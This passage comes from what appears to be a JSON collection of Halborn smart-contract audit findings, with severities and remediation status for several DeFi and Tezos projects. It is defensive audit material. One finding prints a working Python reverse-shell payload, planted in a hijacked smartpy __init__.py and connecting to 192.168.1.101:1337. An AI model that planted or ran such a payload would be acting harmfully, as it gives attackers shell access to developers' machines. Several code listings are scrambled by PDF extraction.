MIN_DAILY_ACC_PNL_DELTA, \"BELOW_MIN\"); - Line 301: require(newValue[1] > newValue[0], \"WRONG_VALUES\"); - Line 307: require(newValue <= MAX_SUPPLY_INCREASE_DAILY_P, \"ABOVE_MAX\"); - Line 313: require(newValue <= MAX_LOSSES_BURN_P, \"ABOVE_MAX\"); - Line 319: require(newValue <= MAX_GNS_SUPPLY_MINT_DAILY_P, \"ABOVE_MAX\"); - Line 325: require(newValue <= MAX_DISCOUNT_P, \"ABOVE_MAX_DISCOUNT\"); - Line 331: require(newValue >= 100 * PRECISION, \"BELOW_MIN\"); - Line 348: require(success == true, \"GNS_PRICE_CALL_FAILED\"); - Line 351: require(price > 0, \"GNS_TOKEN_PRICE_0\"); - Line 433: require(totalSharesBeingWithdrawn(sender)<= balanceOf(sender)- amount, \"PENDING_WITHDRAWAL\"); 28 - Line 443: require(totalSharesBeingWithdrawn(from)<= balanceOf(from)- amount, \" PENDING_WITHDRAWAL\"); - Line 499: require(assets <= maxDeposit(receiver), \"ERC4626: deposit more than max \"); - Line 512: require(shares <= maxMint(receiver), \"ERC4626: mint more than max\"); - Line 526: require(assets <= maxWithdraw(owner), \"ERC4626: withdraw more than max \"); - Line 542: require(shares <= maxRedeem(owner), \"ERC4626: redeem more than max\"); - Line 578: require(openTradesPnlFeed.nextEpochValuesRequestCount()== 0, \" END_OF_EPOCH\"); - Line 582: require(sender == owner || allowance > 0 && allowance >= shares, \" NOT_ALLOWED\"); - Line 584: require(totalSharesBeingWithdrawn(owner)+ shares <= balanceOf(owner), \" MORE_THAN_BALANCE\"); - Line 593: require(shares <= withdrawRequests[owner][unlockEpoch], \"MORE_THAN_WITHDRAW_AMOUNT \"); - Line 597: require(sender == owner || allowance > 0 && allowance >= shares, \" NOT_ALLOWED\"); - Line 614: require(simulatedAssets <= maxDeposit(receiver), \"DEPOSIT_MORE_THAN_MAX \"); - Line 630: require(shares <= maxMint(receiver), \"MINT_MORE_THAN_MAX\"); - Line 651: require(assets > assetsDeposited, \"NO_DISCOUNT\"); - Line 683: require(owner == sender... 29 - Line 686: require(block.timestamp >= d.atTimestamp + d.lockDuration, \" NOT_UNLOCKED\"); - Line 695: require(accPnlPerToken <= int(PRECISION), \"NOT_ENOUGH_ASSETS\"); - Line 725: require(sender == pnlHandler, \"ONLY_TRADING_PNL_HANDLER\"); - Line 734: require(accPnlPerToken <= int(PRECISION), \"NOT_ENOUGH_ASSETS\"); - Line 738: require(dailyAccPnlDelta <= int(maxDailyAccPnlDelta), \"MAX_DAILY_PNL\"); - Line 780: require(assets <= assetsToDeplete, \"AMOUNT_TOO_BIG\"); - Line 801: require(accPnlPerTokenUsed > 0, \"NOT_UNDER_COLLATERALIZED\"); - Line 804: require(assets <= uint(accPnlPerTokenUsed)* supply / PRECISION, \" AMOUNT_TOO_BIG\"); - Line 814: require(dailyMintedGns <= maxGnsSupplyMintDailyP... - Line 839: require(sender == address(openTradesPnlFeed), \"ONLY_PNL_FEED\"); GTokenOpenPnlFeed.sol - Line 104: require(_linkToken != address(0) - Line 122: require(msg.sender == IOwnable(address(gToken)).owner(), \"ONLY_OWNER\"); - Line 127: require(msg.sender == gToken.manager(), \"ONLY_MANAGER\"); - Line 132: require(msg.sender == gToken.admin(), \"ONLY_ADMIN\"); - Line 138: require(newValue >= MIN_REQUESTS_START, \"BELOW_MIN\"); - Line 139: require(newValue <= MAX_REQUESTS_START, \"ABOVE_MAX\"); - Line 145: require(newValue >= MIN_REQUESTS_EVERY, \"BELOW_MIN\"); 30 - Line 146: require(newValue <= MAX_REQUESTS_EVERY, \"ABOVE_MAX\"); - Line 152: require(newValue >= MIN_REQUESTS_COUNT, \"BELOW_MIN\"); - Line 153: require(newValue <= MAX_REQUESTS_COUNT, \"ABOVE_MAX\"); - Line 169: require(newValue >= MIN_ANSWERS, \"BELOW_MIN\"); - Line 170: require(newValue % 2 == 1, \"EVEN\"); - Line 171: require(newValue <= oracles.length / 2, \"ABOVE_MAX\"); - Line 177: require(_index < oracles.length, \"INDEX_TOO_BIG\"); - Line 178: require(newValue != address(0), \"VALUE_0\"); - Line 184: require(newValues.length >= minAnswers * 2, \"ARRAY_TOO_SMALL\"); - Line 190: require(newValue != bytes32(0), \"VALUE_0\"); - Line 198: require(reqToResetCount > 0, \"NO_REQUEST_TO_RESET\"); - Line 218: require(block.timestamp - gToken.currentEpochStart() TWAPPriceGetter.sol - Line 34: require(address(_uniV3Pool)!= address(0)... - Line 49: require(address(_uniV3Pool)!= address(0), \"WRONG_VALUE\"); - Line 56: require(_twapInterval >= MIN_TWAP_PERIOD && _twapInterval <= MAX_TWAP_PERIOD, \"WRONG_VALUE\"); GNSTokenBridge.sol - Line 104: require(msg.value != 0, \"!fee\"); 31 NFTMintingBridge.sol - Line 86: require(msg.value != 0, \"!fee\"); Risk Level: Likelihood - 1 Impact - 1 Recommendation: Custom errors are available since Solidity 0.8.4 version. Consider re- placing all the revert strings with custom errors. Remediation Plan: ACKNOWLEDGED: The Gains Trade team acknowledged this finding. 32 ", "labels": ["Halborn", "Gains_Trade", "Severity: Informational"]}, {"title": "MISSING/INCOMPLETE NATSPEC COMMENTS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Gains_Trade_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "It was identified that the contracts are missing or have incomplete code documentation, which affects the understandability, auditability, and usability of the code. Solidity contracts can use a special form of comments to provide rich doc- umentation for functions, return variables, and more. This special form is named the Ethereum Natural Language Specification Format (*NatSpec**). Risk Level: Likelihood - 1 Impact - 1 Recommendation: Consider adding full NatSpec comments so that all functions have full code documentation for future use. Remediation Plan: ACKNOWLEDGED: The Gains Trade team acknowledged this finding. 33 ", "labels": ["Halborn", "Gains_Trade", "Severity: Informational"]}, {"title": "CHAINLINK LATESTROUNDDATA MIGHT BE STALE OR INCORRECT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "Substance Exchange uses Chainlink as its price oracle. When buying or selling sUSD, the SubstanceUSD contract queries Chainlink for the underlying token price using the latestRoundData() function. This func- tion returns uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt and uint80 answeredInRound. roundId denotes the identifier of the most recent update round, answer is the price of the asset, startedAt is the timestamp at which the round started and updatedAt is the times- The getPrice() function does not tamp at which the feed was updated. check if the feed was updated at the most recent round nor does it verify the update timestamp against the current time, and this can result in accepting stale data which may threaten the stability of the exchange in a volatile market. Code Location: SubstanceUSD.sol#L92 Listing 1: SubstanceUSD.sol (Line 92) function getPrice ( address token , bool min ) public view returns 87  ( uint256 price ) { 88 89 90 91 92  oracle ). latestRoundData () ; 93 94 95 96  ; address oracle = underlyingToken [ token ]. oracle ; if ( oracle == address (0) ) { revert SubstanceUSD__InvalidToken () ; } (, int256 oraclePrice , , , ) = AggregatorV3Interface ( if ( oraclePrice <= 0) { revert SubstanceUSD__InvalidOraclePrice () ; } uint8 pDecimals = AggregatorV3Interface ( oracle ). decimals () 21 price = ( uint256 ( oraclePrice ) * PRECISION ) / (10** price = min ? Math . min ( PRECISION , price ) : Math . max ( 97  pDecimals ); 98  PRECISION , price ); 99 } BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:C/D:N/Y:N/R:N/S:U (6.7) Recommendation: It is recommended to establish confidence intervals for the roundId and updatedAt parameters and reject any Chainlink data feed response which falls outside those ranges. Reference: For further details, see Chainlinks latestRoundData might return stale or incorrect results Remediation Plan:: SOLVED: The Substance Exchange team solved this issue in commit 7717277a. 22 ", "labels": ["Halborn", "Substance_Exchange_Exchange_V1", "Severity: Medium"]}, {"title": "MISSING CHAINLINK ARBITRUM SEQUENCER HEALTH CHECK", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "Arbitrum is a L2 blockchain leveraging Optimistic Rollups to integrate with the underlying L1. A node called sequencer is tasked with submitting user transactions to the L1 and if it fails, communication between the two is impossible. The exchange does not verify if the sequencer is online, which may lead to unexpected behavior if submitting transactions to the Ethereum mainnet is blocked. Code Location: SubstanceUSD.sol#L92 Listing 2: SubstanceUSD.sol (Line 92) function getPrice ( address token , bool min ) public view returns 87  ( uint256 price ) { 88 89 90 91 92  oracle ). latestRoundData () ; 93 94 95 96  ; 97  pDecimals ); 98  PRECISION , price ); 99 } address oracle = underlyingToken [ token ]. oracle ; if ( oracle == address (0) ) { revert SubstanceUSD__InvalidToken () ; } (, int256 oraclePrice , , , ) = AggregatorV3Interface ( if ( oraclePrice <= 0) { revert SubstanceUSD__InvalidOraclePrice () ; } uint8 pDecimals = AggregatorV3Interface ( oracle ). decimals () price = ( uint256 ( oraclePrice ) * PRECISION ) / (10** price = min ? Math . min ( PRECISION , price ) : Math . max ( 23 BVSS: AO:A/AC:L/AX:M/C:N/I:N/A:C/D:N/Y:N/R:N/S:U (6.7) Recommendation: It is recommended to verify the status of the Arbitrum sequencer before updating the contract state. References: Chainlink L2 Sequencer Uptime Feeds Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 24 ", "labels": ["Halborn", "Substance_Exchange_Exchange_V1", "Severity: Medium"]}, {"title": "USING TRANSFER INSTEAD OF SAFETRANSFER", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "Using transfer() instead of safeTransfer() when interacting with ERC20 tokens is not recommended because transfer() does not provide the same level of error handling and safety measures. Code Location: The following contracts use transfer() function: - ExchangeManager.sol - LiquidityPool.sol - SubstanceUSD.sol - UserBalance.sol - BaseFuture.sol - FutureManager.sol - Option.sol - OptionManager.sol - SwapManager.sol - StakingReward.sol BVSS: AO:A/AC:L/AX:L/C:N/I:L/A:N/D:L/Y:N/R:N/S:U (3.1) Recommendation: It is recommended to use the SafeERC20 contract and the safeTransfer() function for token transfers. 25 Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 26 ", "labels": ["Halborn", "Substance_Exchange_Exchange_V1", "Severity: Low"]}, {"title": "FEEONTRANSFER AND BURNONTRANSFER TOKENS ARE NOT SUPPORTED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "Whenever a transfer of tokens is executed (in a swap, a deposit, or while adding liquidity), theres no check if the amount sent is equal to the amount actually received by the contract. The safeTransferFrom function calls transferFrom internally in the token contract to execute the transfer. However, the balance is not verified before and after the transfer and the actual amount transferred may not be the same as the amount received in the case of a fee applied in the token contract. In the case of using a token of this kind, the liquidity providers may not be able to withdraw all of their liquidity. Code Location: UserBalance.sol#L78 Listing 3: UserBalance.sol (Line 82) function userDeposit ( address _token , uint256 _amount ) external 78  { 79 80 81  _amount ); 82 83 84 } _validTokenAddress ( _token ); address user = msgSender () ; IERC20 ( _token ). safeTransferFrom ( user , address ( this ) , userBalance [ user ][ _token ] += _amount ; emit Deposit ( user , _token , _amount ); BVSS: AO:A/AC:L/AX:L/C:N/I:M/A:N/D:M/Y:N/R:P/S:U (3.1) 27 Recommendation: It is recommended to check the balance before and after the transfer to be sure the amount added to the user balance is actually the amount received by the protocol. Listing 4: UserBalance.sol (Line 82) function userDeposit ( address _token , uint256 _amount ) external 78  { 79 80 81 82  _amount ); 83 84 85 86 } _validTokenAddress ( _token ); address user = msgSender () ; uint256 balanceBefore ; = IERC20 ( _token ). balanceOf ( this ); IERC20 ( _token ). safeTransferFrom ( user , address ( this ) , _amount = IERC20 ( _token ). balanceOf ( this ) - balanceBefore ; userBalance [ user ][ _token ] += _amount ; emit Deposit ( user , _token , _amount ); Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 28 ", "labels": ["Halborn", "Substance_Exchange_Exchange_V1", "Severity: Low"]}, {"title": "CENTRALIZATION RISK: PRODUCT MANAGER CAN WITHDRAW ARBITRARY AMOUNTS FROM LIQUIDITY POOLS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The LiquidityPool contract implements the external transfer function, which allows any account with the ProductManger role to withdraw arbitrary amounts of tokens from existing liquidity pools. In case such an account is compromised, the entire protocol liquidity is at risk. Code Location: LiquidityPool.sol#L499 Listing 5: LiquidityPool.sol (Line 501) 499 function transfer ( address _token , address _dist , uint256  _amount ) external isProductManager { poolAmount [ _token ] -= _amount ; IERC20 ( _token ). transfer ( _dist , _amount ); 500 501 502 } BVSS: AO:S/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to reconsider the need for the transfer function and, if deemed necessary for the operations of the protocol, implement a decen- tralized solution like a multi-signature wallet to govern the exchange. 29 Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 30 ", "labels": ["Halborn", "Substance_Exchange_Exchange_V1", "Severity: Low"]}, {"title": "CENTRALIZATION RISK: PRODUCT MANAGER CAN ALTER TOKEN RESERVES INDICATORS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "the contract LiquidityPool increaseLiquidity() The and implements decreaseLiquidity() functions. If called by the Product Manager (which is a role assigned by the contract owner) they can alter the values reported by the token reserves trackers without actually touching the This directly affects reserves, putting the exchange out of balance. protocol accounting and may have negative consequences on the protocol and its users. A good example of this could be a liquidity provider withdrawing their liquidity from the pool, where the transaction would revert. Code Location: LiquidityPool.sol#L489 Listing 6: LiquidityPool.sol (Line 491) 489 function increaseLiquidity ( address _token , uint256 _amount )  external isProductManager { 490 491 492 } _validTokenCheck ( _token ); poolAmount [ _token ] += _amount ; LiquidityPool.sol#L494 Listing 7: LiquidityPool.sol (Line 496) 494 function decreaseLiquidity ( address _token , uint256 _amount )  external isProductManager { 495 496 _validTokenCheck ( _token ); poolAmount [ _token ] -= _amount ; 31 497 } BVSS: AO:S/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to reconsider the need for this function, and if deemed necessary force the execution of token transfers for the reserves to reflect the reported balances. Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 32 ", "labels": ["Halborn", "Substance_Exchange_Exchange_V1", "Severity: Low"]}, {"title": "POTENTIAL ACCESS CONTROL BYPASS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The ProductManager role is used to grant access from some contracts to other contracts functions. There exists a scenario in which any user can be the owner of the entire protocol by means of using the hub contract's delegate calls to call any other protocol contract if the Delegation Hub contract is assigned the ProductManager role for those other contracts, effectively granting anyone privileged access to many sensitive functions. Code Location: Listing 8: OwnableUpgradeable.sol function transferOwnership ( address newOwner ) public virtual 74  onlyOwner { 75  zero address \" ); 76 77 } require ( newOwner != address (0) , \" Ownable : new owner is the _transferOwnership ( newOwner ); BVSS: AO:S/AC:L/AX:L/C:N/I:C/A:N/D:C/Y:N/R:N/S:U (2.5) Recommendation: It is recommended to add a requirement that the Hub contract cannot be assigned the ProductManager role. 33 Remediation Plan: RISK ACCEPTED: The Substance Exchange team accepted the risk of this issue. 34 ", "labels": ["Halborn", "Substance_Exchange_Exchange_V1", "Severity: Low"]}, {"title": "USING ERC721A INSTEAD OF ERC721 FOR MINTING ONLY 1 NFT AT A TIME", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The StakingReward contract uses the ERC721A standard to store the users ERC721A is designed to staking weight and the corresponding rewards. allow multiple mints at the same time with so-called batch transfers (the more tokens minted at the same time, the more gas efficient the operation is) and Substance Exchange is not implementing this core functionality in their protocol. In ERC721A, NFT transfers are more expensive because of the way NFT owner accounts are stored. Code Location: StakingReward.sol#L21 Listing 9: StakingReward.sol 21 contract StakingReward is Ownable , Delegatable , ERC721A { Proof of Concept: For the purposes of this PoC, two different types of NFTs were created, one based on the ERC721A standard and one based on ERC721. 35 constructor () ERC721A ( \" Substance Exchange Stake Azuki \" , \" Listing 10: HalbornERC721A.sol 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.17; 3 4 import \" ../ lib / erc721a / contracts / ERC721A . sol \" ; 5 6 contract HalbornERC721A is ERC721A { 7 8  SEXSTAKE \" ) {} 9 10 11 12 13 14 15 16 17 } _mint ( msg . sender , _quantity ); transferFrom ( msg . sender , _to , tokenId ); } } function mint ( uint256 _quantity ) external payable { function transfer ( address _to , uint256 tokenId ) external { Listing 11: HalbornERC721.sol constructor () ERC721 ( \" Substance Exchange Stake OZ \" , \" SEXSTAKE \" 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.17; 3 4 import \" ../ lib / openzeppelin - contracts / contracts / token / ERC721 /  ERC721 . sol \" ; 5 6 contract HalbornERC721 is ERC721 { 7 8  ) {} 9 10 11 12 13 14 15 16 17 } function transfer ( address _to , uint256 _tokenId ) public { function mint ( uint256 _tokenId ) public { _transfer ( msg . sender , _to , _tokenId ); _mint ( msg . sender , _tokenId ); } } 36 The following scenario was simulated:  Minting an ERC721 (ozNFT) with tokenId = 0  Minting an ERC721A (azukiNFT) with quantity param = 1  Transfer the ozNFT (tokenId = 0) from Alice to Bobby  Transfer the azukiNFT (tokenId = 0) from Alice to Bobby Scenario ozNFT mint azukiNFT mint ozNFT transfer azukiNFT transfer Gas consumed 47081 68824 22400 27817 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:L/Y:N/R:P/S:U (1.2) Recommendation: It is recommended to use the standard ERC721 from Openzeppelin instead of ERC721A for the StakingRewards if only one NFT is processed at a time. 37 Reference: The ERC721A specification can be reviewed here and a detailed comparison with the ERC721 standard is available here. Remediation Plan: SOLVED: The Substance Exchange team solved this issue by replacing the ERC721A standard with ERC721 in commit e45003fe. 38 ", "labels": ["Halborn", "Substance_Exchange_Exchange_V1", "Severity: Informational"]}, {"title": "MISSING FEE RATES SANITY CHECKS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Substance_Exchange_Exchange_V1_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf", "body": "The exchange charges handling fees on certain operations. Fee rates are set by the contract owner and can be updated anytime. None of the setter functions does the sanity check of the provided fee rates, which may lead to contract owners introducing prohibitive or zero fees accidentally or by design. Code Location: SubstanceUSD.sol#L54 Listing 12: SubstanceUSD.sol function setFee ( uint256 _mintFee , uint256 _burnFee ) external 54  onlyOwner { 55 56 57 } mintFee = _mintFee ; burnFee = _burnFee ; SwapManager.sol#L45 Listing 13: SwapManager.sol function setMinExecutionFee ( uint256 _minExecutionFee ) external 45  onlyOwner { 46 47 } minExecutionFee = _minExecutionFee ; OptionManager.sol#L59 Listing 14: OptionManager.sol function setMinExecutionFee ( uint256 _minExecutionFee ) external 45  onlyOwner { 39 46 47 } minExecutionFee = _minExecutionFee ; BaseFuture.sol#L167 Listing 15: BaseFuture.sol 167 function setMinExecutionFee ( uint256 _minExecutionFee ) external  onlyOwner { minExecutionFee = _minExecutionFee ; 168 169 } BVSS: AO:S/AC:L/AX:L/C:N/I:N/A:L/D:N/Y:L/R:F/S:U (0.2) Recommendation: It is recommended to restrict the fee rates to fixed ranges. Remediation Plan: ACKNOWLEDGED: The Substance Exchange team acknowledged this issue. 40 RETESTING 41 The issue described in this section was brought to Halborns attention by the Substance Exchange team during the engagement. 5.1 SUBSTANCE01 - USERS CAN OPEN FUTURE POSITIONS WITHOUT PROVIDING THE COLLATERAL ACCORDINGLY ", "labels": ["Halborn", "Substance_Exchange_Exchange_V1", "Severity: Informational"]}, {"title": "ACCESS CONTROL POLICY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Tezos Smart Contact Audits/Tezos_Oropocket_Smart_Contract_Final_Report_v1.pdf", "body": "In smart contracts, implementing a correct Access Control policy is es- sential to maintain security and decentralization of permissions on a token. The features to mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to keep the prin- ciple of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in simple systems, but more complex projects require the use of more roles using Role-based access control. Therefore, there could be multiple roles such as moderator, minter, admin, or pauser. In both XTZGold and XTZSilver contracts, administrator is only one privi- leged role. Administrator can mint tokens, approving transactions, burn- ing other users token, pausing/unpausing the contract, making transfers while the contract is on pause. In conclusion, administrator role can do too many actions in both contracts. So, if the private key of the admin- istrator account is stolen, the attacker can perform many actions such as minting/burning tokens or approving transactions without following the principle of least privilege. Code Location: XTZGold Line #7-8 XTZSilver Line #7-8 13 Risk Level: Likelihood - 3 Impact - 4 Recommendation: It is recommended to use role-based access control based on the principle of least privilege to lock permissioned functions using different roles; at minimum the roles of ADMIN, MINTER and PAUSER. Reference: https://www.cyberark.com/what-is/least-privilege/ Remediation Plan: After review of the findings and associated risks, the Oropocket team decided that the current access control policy is proper, and will leave the single Admin role access control policy that exists presently. 14 ", "labels": ["Halborn", "Tezos_Oropocket_Final", "Severity: Medium"]}, {"title": "HIJACKING PYTHON LIBRARY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Tezos Smart Contact Audits/Tezos_Oropocket_Smart_Contract_Final_Report_v1.pdf", "body": "In general, Python doesnt check the legitimacy of a library when a script imports it. In this case, XTZGold and XTZSilver Smart Contracts start by importing the smartpy library. If smartpy library is hijacked by an attacker, some actions can be triggered such as getting a reverse shell either as user or root if the library is imported with sudo permissions. In the following Proof of Concept (PoC), it is assumed the system has been already compromised. This methodology is known as Assumed Breach Methodology. Reference: https://www.netsurion.com/articles/the-assume-breach- paradigm Proof of Concept: An Ubuntu VM and a Kali Linux VM (IP Address: 192.168.1.101) are used in this PoC. 1. An attacker replaces the __init__.py file $HOME/.local/lib/python3.8/site-packages/smartpy/ custom script to get a reverse shell: located for in a import socket import subprocess import os s= socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) s. connect (( \" 192.168.1.101 \" ,1337) ) os . dup2 ( s. fileno () ,0) 15 os . dup2 ( s. fileno () ,1) os . dup2 ( s. fileno () ,2) p= subprocess . call ([ \" / bin / sh \" ,\" -i\" ]) 2. In a terminal in Kali Linux, a netcat is listening in port 1337. 3. smartpy library is imported. 4. A new shell is received in Kali Linux VM. 5. The same thing if you run Python as root, but a root shell is received. 16 Risk Level: Likelihood - 1 Impact - 4 Recommendation: It is important to check if libraries are updated at the moment python scripts are tested locally. Although the breach is assumed in this vulnerability, it is a good practice to reinstall (--force flag) the library before running a python script or interpreter in order to be sure that the library version is correct and legit. Secondly, testing smart contracts in SmartPy IDE web avoid this vulnerability. In SmartPy IDE, libraries are locally stored and they are regularly checked and updated. Remediation Plan: Oropocket team will use the SmartPy IDE to compile and deploy the smart contracts to avoid potential library vulnerabilities. 17 ", "labels": ["Halborn", "Tezos_Oropocket_Final", "Severity: Low"]}, {"title": "MINTING CAP NOT DEFINED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Tezos Smart Contact Audits/Tezos_Oropocket_Smart_Contract_Final_Report_v1.pdf", "body": "Smart Contract which can mint and burn tokens usually define how many tokens they want to mint. It is also know as cap and is defined in the constructor. Code Location: XTZGold Line #7-8 XTZSilver Line #7-8 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to define how many tokens to mint in the constructor. Remediation Plan: Oropocket team accepts the current unlimited Minting cap that is presently used. 18 ", "labels": ["Halborn", "Tezos_Oropocket_Final", "Severity: Informational"]}, {"title": "LOCK MINTING FUNCTION NOT DECLARED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Tezos Smart Contact Audits/Tezos_Oropocket_Smart_Contract_Final_Report_v1.pdf", "body": "In Python Smart Contracts developed by SmartPy, it is possible to prevent any new tokens from being minted using a LockMinting function. With this function, even the administrator role cannot mint tokens. Risk Level: Likelihood - 1 Impact - 2 Recommendation: Implementing a LockMinting function, it is possible to prevent any new tokens from being minted. It makes more sense using this function if a Role-based access control is implemented, so it is a way to control the minting of tokens of the MINTER_ROLE by the admin. Remediation Plan: Oropocket team doesnt consider it necessary to declare a lock minting function with the current design in the role and access control policies. 19 3.5 MANUAL TESTING REPORT ", "labels": ["Halborn", "Tezos_Oropocket_Final", "Severity: Informational"]}, {"title": "LACK OF VALIDATION UPON BRIDGE REMOVAL", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Maker_Contract_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "AssetInfo instances do not normalize capitalization, taking as different assets ULUNA and uluna. When using the update_bridges function to remove bridges, if a different capitalization was used on the elements of the remove parameter the operation resulted in no modifications being done without the sender receiving any error feedback, as those wont be found in the current list of bridges. In case the owner unwillingly included incorrect assets to remove the bridge, the undesired bridge would still be available to perform token swapping by the contract, potentially affecting the contracts toke- nomics. Code Location: Listing 1: contracts/tokenomics/maker/src/contract.rs (Line 688) 685 686 687 688 689 690 // remove old bridges if let Some ( remove_bridges ) = remove { for asset in remove_bridges { BRIDGES . remove ( deps . storage , asset . to_string () ); } } Risk Level: Likelihood - 2 Impact - 3 12 Recommendation: Validate the assets provided in the remove parameter to ensure that all In addition, an error could be of them follow proper capitalization. raised if the asset to be removed if they are not found on the BRIDGES state variable. Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit b7fa67c4d2429e61139331717639cd8f50cb1629. 13 ", "labels": ["Halborn", "Astroport_fi_Maker_Contract_CosmWasm", "Severity: Low"]}, {"title": "MISUSE OF HELPER METHODS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Maker_Contract_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The use of the unwrap function is very useful for testing environments because a value is forcibly demanded to get an error (aka panic!) if the Option does not have Some value or Result. Nevertheless, leaving unwrap functions in production environments is a bad practice because not only will this cause the program to crash out, or panic!, but also no helpful messages are shown to help the user solve or understand the reason of the error. Code Location: Listing 2: Affected resources 1 contracts / tokenomics / maker / src / contract . rs :801: let ( asset , bridge ) = item . unwrap () ; 2 contracts / tokenomics / maker / src / contract . rs :802: ( String :: from_utf8 ( asset ). unwrap () , bridge . to_string () ) Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to avoid the use of unwrap or expect functions in production environments as it could cause a panic!, crashing the con- tract without error messages. Some alternatives are possible, such as propagating the error by putting a \"?\", using unwrap_or / unwrap_or_else / unwrap_or_default functions, or using error-chain crate for errors 14 Reference: https://crates.io/crates/error-chain Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit b7fa67c4d2429e61139331717639cd8f50cb1629. 15 ", "labels": ["Halborn", "Astroport_fi_Maker_Contract_CosmWasm", "Severity: Informational"]}, {"title": "UNCHECKED MATH", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Maker_Contract_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "In computer programming, an overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. This issue has been raised as informational only, as it was not possible to define a clear exploitation scenario. However, the affected lines resembled potentially risky patterns and therefore has been highlighted for consideration. Code Location: Listing 3: Affected resources 1 contracts / tokenomics / maker / src / contract . rs :520: Uint128 :: from ( blocks_passed ) * astro_distribution_portion , 2 contracts / tokenomics / maker / src / contract . rs :525: amount -= remainder_reward ; 3 contracts / tokenomics / maker / src / contract . rs :529: amount += current_preupgrade_distribution ; Risk Level: Likelihood - 1 Impact - 1 Recommendation: In the release mode, Rust does not panic on overflows and overflown values just wrap without any explicit feedback to the user. It is rec- ommended then to use vetted safe math libraries for arithmetic operations 16 Consider replacing consistently throughout the smart contract system. the addition operator with Rusts checked_add method, the subtraction operator with Rusts checked_subs method, and so on. Remediation plan: SOLVED: The issue was fixed with the above recommendation in commit b7fa67c4d2429e61139331717639cd8f50cb1629. 17 ", "labels": ["Halborn", "Astroport_fi_Maker_Contract_CosmWasm", "Severity: Informational"]}, {"title": "OVERFLOW CHECKS NOT SET FOR PROFILE RELEASE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Astroport_fi_Maker_Contract_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "While the overflow-checks parameter is set to true in profile.release and implicitly applied to all contracts and packages from in workspace, it is not explicitly enabled in Cargo.toml file for each individual package, which could lead to unexpected consequences if the project is refactored. Code Location: Listing 4: Affected resources 1 contracts / tokenomics / maker / Cargo . toml Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to enable overflow checks explicitly in each individual contract and package. That measure helps when the project is refactored to prevent unintended consequences. Remediation plan: ACKNOWLEDGED: Astroport acknowledged this finding. 18 ", "labels": ["Halborn", "Astroport_fi_Maker_Contract_CosmWasm", "Severity: Informational"]}, {"title": "VULNERABLE 